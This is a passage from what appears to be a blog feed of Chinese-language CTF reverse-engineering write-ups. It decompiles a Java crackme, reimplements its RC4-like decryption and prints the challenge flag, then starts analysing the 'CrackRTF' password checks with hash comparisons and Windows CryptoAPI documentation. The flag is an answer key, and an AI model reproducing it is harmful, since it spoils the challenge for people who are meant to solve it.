class="hljs-keyword">int</span> i;</span><br><span class="line">        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; ++i) {</span><br><span class="line">            j = (j + iS[i] + iK[i]) % <span class="hljs-number">256</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        i = <span class="hljs-number">0</span>;</span><br><span class="line">        j = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">char</span>[] iInputChar = aaa.toCharArray();</span><br><span class="line">        <span class="hljs-keyword">char</span>[] iOutputChar = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[iInputChar.length];</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">short</span> x = <span class="hljs-number">0</span>; x &lt; iInputChar.length; ++x) {</span><br><span class="line">            i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;</span><br><span class="line">            j = (j + iS[i]) % <span class="hljs-number">256</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">            <span class="hljs-keyword">int</span> t = (iS[i] + iS[j] % <span class="hljs-number">256</span>) % <span class="hljs-number">256</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> iY = iS[t];</span><br><span class="line">            <span class="hljs-keyword">char</span> iCY = (<span class="hljs-keyword">char</span>)iY;</span><br><span class="line">            iOutputChar[x] = (<span class="hljs-keyword">char</span>)(iInputChar[x] ^ iCY);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(iOutputChar);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由此可见什么斐波那契数列并没有什么用，真正有用的是<code>heheda()</code>和<code>hello()</code>，其中调用了<code>b</code>类的数据</p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="hljs-comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">package</span> top.phrack.ctf.Fibonacci;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>[] x = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[]{<span class="hljs-string">'}'</span>, <span class="hljs-string">'\u0010'</span>, <span class="hljs-string">'ý'</span>, <span class="hljs-string">'É'</span>, <span class="hljs-string">'\u000b'</span>, <span class="hljs-string">'\u0016'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'D'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">','</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'Í'</span>};</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>[] y = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[]{<span class="hljs-string">'t'</span>, <span class="hljs-string">'\u0096'</span>, <span class="hljs-string">'®'</span>, <span class="hljs-string">'D'</span>, <span class="hljs-string">'´'</span>, <span class="hljs-string">'Z'</span>, <span class="hljs-string">'Ö'</span>, <span class="hljs-string">'½'</span>, <span class="hljs-string">'O'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'\u0085'</span>, <span class="hljs-string">'\n'</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'½'</span>, <span class="hljs-string">'Ù'</span>, <span class="hljs-string">'O'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\u0013'</span>, <span class="hljs-string">'\u008a'</span>, <span class="hljs-string">'Ç'</span>, <span class="hljs-string">'\u0080'</span>, <span class="hljs-string">'@'</span>, <span class="hljs-string">'Ü'</span>, <span class="hljs-string">'Þ'</span>, <span class="hljs-string">'ê'</span>, <span class="hljs-string">'\u000b'</span>, <span class="hljs-string">'¯'</span>, <span class="hljs-string">'ä'</span>, <span class="hljs-string">'\u0081'</span>};</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">b</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以直接在<code>java</code>环境里运行一下就可以了</p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//Main.java</span></span><br><span class="line"><span class="hljs-keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heheda</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        String bb = <span class="hljs-keyword">new</span> String(b.x);</span><br><span class="line">        String cb = <span class="hljs-keyword">new</span> String(b.y);</span><br><span class="line">        System.out.println(hello(cb, bb));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        heheda();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">hello</span><span class="hljs-params">(String aaa, String bbb)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">int</span>[] iS = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">256</span>];</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] iK = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">256</span>];</span><br><span class="line">        <span class="hljs-keyword">int</span> j;</span><br><span class="line">        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; iS[j] = j++) {</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">short</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; ++i) {</span><br><span class="line">            iK[i] = (<span class="hljs-keyword">byte</span>) bbb.charAt(i % bbb.length());</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        j = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">int</span> i;</span><br><span class="line">        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; ++i) {</span><br><span class="line">            j = (j + iS[i] + iK[i]) % <span class="hljs-number">256</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        i = <span class="hljs-number">0</span>;</span><br><span class="line">        j = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">char</span>[] iInputChar = aaa.toCharArray();</span><br><span class="line">        <span class="hljs-keyword">char</span>[] iOutputChar = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[iInputChar.length];</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">short</span> x = <span class="hljs-number">0</span>; x &lt; iInputChar.length; ++x) {</span><br><span class="line">            i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;</span><br><span class="line">            j = (j + iS[i]) % <span class="hljs-number">256</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">            <span class="hljs-keyword">int</span> t = (iS[i] + iS[j] % <span class="hljs-number">256</span>) % <span class="hljs-number">256</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> iY = iS[t];</span><br><span class="line">            <span class="hljs-keyword">char</span> iCY = (<span class="hljs-keyword">char</span>) iY;</span><br><span class="line">            iOutputChar[x] = (<span class="hljs-keyword">char</span>) (iInputChar[x] ^ iCY);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(iOutputChar);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//b.java</span></span><br><span class="line"><span class="hljs-keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>[] x = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[]{<span class="hljs-string">'}'</span>, <span class="hljs-string">'\u0010'</span>, <span class="hljs-string">'ý'</span>, <span class="hljs-string">'É'</span>, <span class="hljs-string">'\u000b'</span>, <span class="hljs-string">'\u0016'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'D'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">','</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'Í'</span>};</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>[] y = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[]{<span class="hljs-string">'t'</span>, <span class="hljs-string">'\u0096'</span>, <span class="hljs-string">'®'</span>, <span class="hljs-string">'D'</span>, <span class="hljs-string">'´'</span>, <span class="hljs-string">'Z'</span>, <span class="hljs-string">'Ö'</span>, <span class="hljs-string">'½'</span>, <span class="hljs-string">'O'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'\u0085'</span>, <span class="hljs-string">'\n'</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'½'</span>, <span class="hljs-string">'Ù'</span>, <span class="hljs-string">'O'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\u0013'</span>, <span class="hljs-string">'\u008a'</span>, <span class="hljs-string">'Ç'</span>, <span class="hljs-string">'\u0080'</span>, <span class="hljs-string">'@'</span>, <span class="hljs-string">'Ü'</span>, <span class="hljs-string">'Þ'</span>, <span class="hljs-string">'ê'</span>, <span class="hljs-string">'\u000b'</span>, <span class="hljs-string">'¯'</span>, <span class="hljs-string">'ä'</span>, <span class="hljs-string">'\u0081'</span>};</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">b</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行直接输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">PCTF</span>{<span class="hljs-number">1</span>ts_not_<span class="hljs-number">5</span>c<span class="hljs-number">2</span>ipt_Chall<span class="hljs-number">3</span>nge}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> Javis OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CrackRTF-buuctf</title>
      <link href="/2020/04/01/CrackRTF-buuctf/"/>
      <url>/2020/04/01/CrackRTF-buuctf/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这一题用到了一些windows加密算法中的东西</p><span id="more"></span><p>根据字符串找到了关键的部分函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00401690</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">size_t</span> sVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar3;</span><br><span class="line">  undefined4 *puVar4;</span><br><span class="line">  <span class="hljs-keyword">char</span> *pcVar5;</span><br><span class="line">  undefined4 local_354 [<span class="hljs-number">16</span>];</span><br><span class="line">  BYTE local_314 [<span class="hljs-number">260</span>];</span><br><span class="line">  <span class="hljs-keyword">int</span> local_210;</span><br><span class="line">  <span class="hljs-keyword">char</span> local_20c [<span class="hljs-number">260</span>];</span><br><span class="line">  byte local_108 [<span class="hljs-number">256</span>];</span><br><span class="line">  undefined4 uStack8;</span><br><span class="line">  </span><br><span class="line">  iVar3 = <span class="hljs-number">0xd4</span>;</span><br><span class="line">  puVar4 = local_354;</span><br><span class="line">  <span class="hljs-keyword">while</span> (iVar3 != <span class="hljs-number">0</span>) {</span><br><span class="line">    iVar3 = iVar3 + <span class="hljs-number">-1</span>;</span><br><span class="line">    *puVar4 = <span class="hljs-number">0xcccccccc</span>;</span><br><span class="line">    puVar4 = puVar4 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  _memset(local_108,<span class="hljs-number">0</span>,<span class="hljs-number">0x104</span>);</span><br><span class="line">  _memset(local_20c,<span class="hljs-number">0</span>,<span class="hljs-number">0x104</span>);</span><br><span class="line">  local_210 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">FUN_00401e60</span>((byte *)<span class="hljs-string">"pls input the first passwd(1): "</span>);</span><br><span class="line">  <span class="hljs-built_in">FUN_00401e00</span>(&amp;DAT_00426104);</span><br><span class="line">  sVar1 = _strlen((<span class="hljs-keyword">char</span> *)local_108);</span><br><span class="line">  <span class="hljs-keyword">if</span> (sVar1 != <span class="hljs-number">6</span>) {</span><br><span class="line">    <span class="hljs-built_in">FUN_00401e60</span>((byte *)<span class="hljs-string">"Must be 6 characters!\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    __chkesp();</span><br><span class="line">  }</span><br><span class="line">  local_210 = <span class="hljs-built_in">FUN_00401c30</span>(local_108);</span><br><span class="line">  <span class="hljs-keyword">if</span> (local_210 &lt; <span class="hljs-number">100000</span>) {</span><br><span class="line">    <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    __chkesp();</span><br><span class="line">  }</span><br><span class="line">  FID_conflict:_strcat((<span class="hljs-keyword">char</span> *)local_108,<span class="hljs-string">"@DBApp"</span>);</span><br><span class="line">  pcVar5 = local_20c;</span><br><span class="line">  sVar1 = _strlen((<span class="hljs-keyword">char</span> *)local_108);</span><br><span class="line">  <span class="hljs-built_in">thunk_FUN_00401230</span>(local_108,sVar1,pcVar5);</span><br><span class="line">  iVar3 = __strcmpi(local_20c,<span class="hljs-string">"6E32D0943418C2C33385BC35A1470250DD8923A9"</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-built_in">FUN_00401e60</span>((byte *)<span class="hljs-string">"continue...\n\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">FUN_00401e60</span>((byte *)<span class="hljs-string">"pls input the first passwd(2): "</span>);</span><br><span class="line">    _memset(local_314,<span class="hljs-number">0</span>,<span class="hljs-number">0x104</span>);</span><br><span class="line">    <span class="hljs-built_in">FUN_00401e00</span>(&amp;DAT_00426104);</span><br><span class="line">    sVar1 = _strlen((<span class="hljs-keyword">char</span> *)local_314);</span><br><span class="line">    <span class="hljs-keyword">if</span> (sVar1 != <span class="hljs-number">6</span>) {</span><br><span class="line">      <span class="hljs-built_in">FUN_00401e60</span>((byte *)<span class="hljs-string">"Must be 6 characters!\n"</span>);</span><br><span class="line">      <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      __chkesp();</span><br><span class="line">    }</span><br><span class="line">    FID_conflict:_strcat((<span class="hljs-keyword">char</span> *)local_314,(<span class="hljs-keyword">char</span> *)local_108);</span><br><span class="line">    _memset(local_20c,<span class="hljs-number">0</span>,<span class="hljs-number">0x104</span>);</span><br><span class="line">    pcVar5 = local_20c;</span><br><span class="line">    sVar1 = _strlen((<span class="hljs-keyword">char</span> *)local_314);</span><br><span class="line">    <span class="hljs-built_in">thunk_FUN_00401040</span>(local_314,sVar1,pcVar5);</span><br><span class="line">    iVar3 = __strcmpi(<span class="hljs-string">"27019e688a4e62a649fd99cadaafdb4e"</span>,local_20c);</span><br><span class="line">    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) {</span><br><span class="line">      uVar2 = <span class="hljs-built_in">thunk_FUN_004014d0</span>((LPCSTR)local_314);</span><br><span class="line">      <span class="hljs-keyword">if</span> ((uVar2 &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">        <span class="hljs-built_in">FUN_00401e60</span>((byte *)<span class="hljs-string">"Error!!\n"</span>);</span><br><span class="line">        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);</span><br><span class="line">        __chkesp();</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-built_in">FUN_00401e60</span>((byte *)<span class="hljs-string">"bye ~~\n"</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  uStack8 = <span class="hljs-number">0x4018f6</span>;</span><br><span class="line">  __chkesp();</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>需要pass两层密码才可以，仔细看一下加密的部分</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">FUN_00401230</span><span class="hljs-params">(BYTE *param_1,DWORD param_2,LPSTR param_3)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar1;</span><br><span class="line">  undefined4 *puVar2;</span><br><span class="line">  undefined4 local_6c [<span class="hljs-number">16</span>];</span><br><span class="line">  uint local_2c;</span><br><span class="line">  CHAR local_28 [<span class="hljs-number">4</span>];</span><br><span class="line">  byte local_24 [<span class="hljs-number">20</span>];</span><br><span class="line">  DWORD local_10;</span><br><span class="line">  HCRYPTHASH local_c;</span><br><span class="line">  HCRYPTPROV local_8;</span><br><span class="line">  </span><br><span class="line">  iVar1 = <span class="hljs-number">0x1a</span>;</span><br><span class="line">  puVar2 = local_6c;</span><br><span class="line">  <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>) {</span><br><span class="line">    iVar1 = iVar1 + <span class="hljs-number">-1</span>;</span><br><span class="line">    *puVar2 = <span class="hljs-number">0xcccccccc</span>;</span><br><span class="line">    puVar2 = puVar2 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">CryptAcquireContextA</span>(&amp;local_8,(LPCSTR)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0xf0000000</span>);</span><br><span class="line">  iVar1 = __chkesp();</span><br><span class="line">  <span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-built_in">CryptCreateHash</span>(local_8,<span class="hljs-number">0x8004</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;local_c);</span><br><span class="line">    iVar1 = __chkesp();</span><br><span class="line">    <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {</span><br><span class="line">      <span class="hljs-built_in">CryptReleaseContext</span>(local_8,<span class="hljs-number">0</span>);</span><br><span class="line">      __chkesp();</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      <span class="hljs-built_in">CryptHashData</span>(local_c,param_1,param_2,<span class="hljs-number">0</span>);</span><br><span class="line">      iVar1 = __chkesp();</span><br><span class="line">      <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {</span><br><span class="line">        <span class="hljs-built_in">CryptDestroyHash</span>(local_c);</span><br><span class="line">        __chkesp();</span><br><span class="line">        <span class="hljs-built_in">CryptReleaseContext</span>(local_8,<span class="hljs-number">0</span>);</span><br><span class="line">        __chkesp();</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-built_in">CryptGetHashParam</span>(local_c,<span class="hljs-number">2</span>,local_24,&amp;local_10,<span class="hljs-number">0</span>);</span><br><span class="line">        __chkesp();</span><br><span class="line">        *param_3 = <span class="hljs-string">'\0'</span>;</span><br><span class="line">        local_2c = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">while</span> (local_2c &lt; local_10) {</span><br><span class="line">          <span class="hljs-built_in">wsprintfA</span>(local_28,<span class="hljs-string">"%02X"</span>,(uint)local_24[local_2c]);</span><br><span class="line">          __chkesp();</span><br><span class="line">          <span class="hljs-built_in">lstrcatA</span>(param_3,local_28);</span><br><span class="line">          __chkesp();</span><br><span class="line">          local_2c = local_2c + <span class="hljs-number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-built_in">CryptDestroyHash</span>(local_c);</span><br><span class="line">        __chkesp();</span><br><span class="line">        <span class="hljs-built_in">CryptReleaseContext</span>(local_8,<span class="hljs-number">0</span>);</span><br><span class="line">        __chkesp();</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  local_8 = <span class="hljs-number">0x4013b8</span>;</span><br><span class="line">  __chkesp();</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>第一层加密，重点看看一个函数<code>CryptCreateHash(local_8,0x8004,0,0,&amp;local_c)</code></p><p>上微软查查定义</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">BOOL <span class="hljs-title">CryptCreateHash</span><span class="hljs-params">(</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">  HCRYPTPROV hProv,</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">  ALG_ID     Algid,</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">  HCRYPTKEY  hKey,</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">  DWORD      dwFlags,</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">  HCRYPTHASH *phHash</span></span></span><br><span class="line"><span class="hljs-params"><span class="hljs-function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p><code>hProv</code><br>A handle to a CSP created by a call to <a href="https://docs.microsoft.com/windows/desktop/api/wincrypt/nf-wincrypt-cryptacquirecontexta">CryptAcquireContext</a>.</p><p><code>Algid</code><br>An <a href="https://docs.microsoft.com/windows/desktop/SecCrypto/alg-id">ALG_ID</a> value that identifies the hash algorithm to use.</p><p>Valid values for this parameter vary, depending on the CSP that is used. For a list of default algorithms, see Remarks.</p><p><code>hKey</code><br>If the type of hash algorithm is a keyed hash, such as the <a href="https://docs.microsoft.com/windows/desktop/SecGloss/h-gly">Hash-Based Message Authentication Code</a> (HMAC) or <a href="https://docs.microsoft.com/windows/desktop/SecGloss/m-gly">Message Authentication Code</a> (MAC) algorithm, the key for the hash is passed in this parameter. For nonkeyed algorithms, this parameter must be set to zero.</p><p>For keyed algorithms, the key must be to a <a href="https://docs.microsoft.com/windows/desktop/SecGloss/b-gly">block cipher</a> key, such as RC2, that has a <a href="https://docs.microsoft.com/windows/desktop/SecGloss/c-gly">cipher mode</a> of <a href="https://docs.microsoft.com/windows/desktop/SecGloss/c-gly">Cipher Block 